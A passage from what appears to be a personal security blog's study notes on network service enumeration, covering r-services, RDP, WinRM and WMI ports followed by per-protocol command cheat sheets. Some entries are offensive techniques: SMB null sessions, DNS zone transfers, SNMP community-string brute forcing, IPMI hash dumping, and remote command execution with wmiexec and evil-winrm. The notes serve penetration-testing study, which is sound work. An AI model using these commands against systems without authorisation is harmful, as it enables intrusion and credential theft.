Rexec.</p><p><strong>Ports</strong></p><ul><li>514 (TCP/UDP): Used for Rsh (Remote Shell).</li><li>513 (TCP/UDP): Used for Rlogin (Remote Login).</li><li>512 (TCP): Used for Rexec (Remote Execution).</li></ul><p><strong>Commands</strong></p><table><thead><tr><th>Command</th><th>Service Daemon</th><th>Port</th><th>Transport Protocol</th><th>Description</th></tr></thead><tbody><tr><td><code>rcp</code></td><td>rshd</td><td>514</td><td>TCP</td><td>Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.</td></tr><tr><td><code>rsh</code></td><td>rshd</td><td>514</td><td>TCP</td><td>Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.</td></tr><tr><td><code>rexec</code></td><td>rexecd</td><td>512</td><td>TCP</td><td>Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.</td></tr><tr><td><code>rlogin</code></td><td>rlogind</td><td>513</td><td>TCP</td><td>Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.</td></tr></tbody></table><h3 id=rdp>RDP<a hidden class=anchor aria-hidden=true href=#rdp>#</a></h3><p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, providing a user with a graphical interface to connect to another computer over a network connection.</p><p><strong>Ports</strong></p><ul><li>3389 (TCP/UDP): The default port used for RDP connections.</li></ul><p><strong>RDP Tools</strong></p><ul><li>nmap</li><li>xfreerdp</li><li>rdesktop</li><li>remmina</li></ul><h3 id=windows-remote-management-winrm>Windows Remote Management (WinRM)<a hidden class=anchor aria-hidden=true href=#windows-remote-management-winrm>#</a></h3><p>Windows Remote Management (WinRM) is Microsoft&rsquo;s implementation of the WS-Management protocol, a standard web services protocol used for remote software and hardware management.</p><p><strong>Ports</strong></p><ul><li>5985 (TCP): Used for HTTP connections.</li><li>5986 (TCP): Used for HTTPS connections.</li></ul><p><strong>WinRM Tools</strong></p><ul><li>Test-WsMan</li><li>evil-winrm</li></ul><h3 id=wmi>WMI<a hidden class=anchor aria-hidden=true href=#wmi>#</a></h3><p>Windows Management Instrumentation (WMI) is a set of extensions to the Windows Driver Model that provides an operating system interface through which instrumented components provide information and notification.</p><p><strong>Ports</strong></p><ul><li>135 (TCP): The default port used for WMI connections.</li></ul><p><strong>WMI Tools</strong></p><ul><li>wmiexec.py</li></ul><h3 id=infrastructure-based-enumeration-cheatsheet>Infrastructure-based Enumeration Cheatsheet<a hidden class=anchor aria-hidden=true href=#infrastructure-based-enumeration-cheatsheet>#</a></h3><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>curl -s https://crt.sh/\?q\=&lt;target-domain>\&amp;output\=json | jq .</code></td><td>Certificate transparency.</td></tr><tr><td><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></td><td>Scan each IP address in a list using Shodan.</td></tr></tbody></table><h3 id=host-based-enumeration-cheatsheet>Host-based Enumeration Cheatsheet<a hidden class=anchor aria-hidden=true href=#host-based-enumeration-cheatsheet>#</a></h3><p><strong>FTP</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ftp &lt;FQDN/IP></code></td><td>Interact with the FTP service on the target.</td></tr><tr><td><code>nc -nv &lt;FQDN/IP> 21</code></td><td>Interact with the FTP service on the target.</td></tr><tr><td><code>telnet &lt;FQDN/IP> 21</code></td><td>Interact with the FTP service on the target.</td></tr><tr><td><code>openssl s_client -connect &lt;FQDN/IP>:21 -starttls ftp</code></td><td>Interact with the FTP service on the target using encrypted connection.</td></tr><tr><td><code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target></code></td><td>Download all available files on the target FTP server.</td></tr></tbody></table><p><strong>SMB</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>smbclient -N -L //&lt;FQDN/IP></code></td><td>Null session authentication on SMB.</td></tr><tr><td><code>smbclient //&lt;FQDN/IP>/&lt;share></code></td><td>Connect to a specific SMB share.</td></tr><tr><td><code>rpcclient -U "" &lt;FQDN/IP></code></td><td>Interaction with the target using RPC.</td></tr><tr><td><code>samrdump.py &lt;FQDN/IP></code></td><td>Username enumeration using Impacket scripts.</td></tr><tr><td><code>smbmap -H &lt;FQDN/IP></code></td><td>Enumerating SMB shares.</td></tr><tr><td><code>crackmapexec smb &lt;FQDN/IP> --shares -u '' -p ''</code></td><td>Enumerating SMB shares using null session authentication.</td></tr><tr><td><code>enum4linux-ng.py &lt;FQDN/IP> -A</code></td><td>SMB enumeration using enum4linux.</td></tr></tbody></table><p><strong>NFS</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>showmount -e &lt;FQDN/IP></code></td><td>Show available NFS shares.</td></tr><tr><td><code>mount -t nfs &lt;FQDN/IP>:/&lt;share> ./target-NFS/ -o nolock</code></td><td>Mount the specific NFS share.umount ./target-NFS</td></tr><tr><td><code>umount ./target-NFS</code></td><td>Unmount the specific NFS share.</td></tr></tbody></table><p><strong>DNS</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>dig ns &lt;domain.tld> @&lt;nameserver></code></td><td>NS request to the specific nameserver.</td></tr><tr><td><code>dig any &lt;domain.tld> @&lt;nameserver></code></td><td>ANY request to the specific nameserver.</td></tr><tr><td><code>dig axfr &lt;domain.tld> @&lt;nameserver></code></td><td>AXFR request to the specific nameserver.</td></tr><tr><td><code>dnsenum --dnsserver &lt;nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld></code></td><td>Subdomain brute forcing.</td></tr></tbody></table><p><strong>SMTP</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>telnet &lt;FQDN/IP> 25</code></td><td></td></tr></tbody></table><p><strong>IMAP/POP3</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>curl -k 'imaps://&lt;FQDN/IP>' --user &lt;user>:&lt;password></code></td><td>Log in to the IMAPS service using cURL.</td></tr><tr><td><code>openssl s_client -connect &lt;FQDN/IP>:imaps</code></td><td>Connect to the IMAPS service.</td></tr><tr><td><code>openssl s_client -connect &lt;FQDN/IP>:pop3s</code></td><td>Connect to the POP3s service.</td></tr></tbody></table><p><strong>SNMP</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>snmpwalk -v2c -c &lt;community string> &lt;FQDN/IP></code></td><td>Querying OIDs using snmpwalk.</td></tr><tr><td><code>onesixtyone -c community-strings.list &lt;FQDN/IP></code></td><td>Bruteforcing community strings of the SNMP service.</td></tr><tr><td><code>braa &lt;community string>@&lt;FQDN/IP>:.1.*</code></td><td>Bruteforcing SNMP service OIDs.</td></tr></tbody></table><p><strong>MySQL</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>mysql -u &lt;user> -p&lt;password> -h &lt;FQDN/IP></code></td><td>Login to the MySQL server.</td></tr></tbody></table><p><strong>MSSQL</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>mssqlclient.py &lt;user>@&lt;FQDN/IP> -windows-auth</code></td><td>Log in to the MSSQL server using Windows authentication.</td></tr></tbody></table><p><strong>IPMI</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code></td><td>IPMI version detection.</td></tr><tr><td><code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code></td><td>Dump IPMI hashes.</td></tr></tbody></table><p><strong>Linux Remote Management</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ssh-audit.py &lt;FQDN/IP></code></td><td>Remote security audit against the target SSH service.</td></tr><tr><td><code>ssh &lt;user>@&lt;FQDN/IP></code></td><td>Log in to the SSH server using the SSH client.</td></tr><tr><td><code>ssh -i private.key &lt;user>@&lt;FQDN/IP></code></td><td>Log in to the SSH server using private key.</td></tr><tr><td><code>ssh &lt;user>@&lt;FQDN/IP> -o PreferredAuthentications=password</code></td><td>Enforce password-based authentication.</td></tr></tbody></table><p><strong>Windows Remote Management</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>rdp-sec-check.pl &lt;FQDN/IP></code></td><td>Check the security settings of the RDP service.</td></tr><tr><td><code>xfreerdp /u:&lt;user> /p:"&lt;password>" /v:&lt;FQDN/IP></code></td><td>Log in to the RDP server from Linux.</td></tr><tr><td><code>evil-winrm -i &lt;FQDN/IP> -u &lt;user> -p &lt;password></code></td><td>Log in to the WinRM server.</td></tr><tr><td><code>wmiexec.py &lt;user>:"&lt;password>"@&lt;FQDN/IP> "&lt;system command>"</code></td><td>Execute command using the WMI service.</td></tr></tbody></table><p><strong>Oracle TNS</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>./odat.py all -s &lt;FQDN/IP></code></td><td>Perform a variety of scans to gather information about the Oracle database services and its components.</td></tr><tr><td><code>sqlplus &lt;user>/&lt;pass>@&lt;FQDN/IP>/&lt;db></code></td><td>Log in to the Oracle database.</td></tr><tr><td><code>./odat.py utlfile -s &lt;FQDN/IP> -d &lt;db> -U &lt;user> -P &lt;pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt</code></td><td>Upload a file with Oracle RDBMS.</td></tr></tbody></table><p> </p><hr><p> </p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://woadey.xyz/posts/htb/easy/nibbles/><span class=title>Next »</span><br><span>HTB Writeup: Nibbles</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://woadey.xyz/>woadey</a></span>
<span>· Theme: tweaked
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>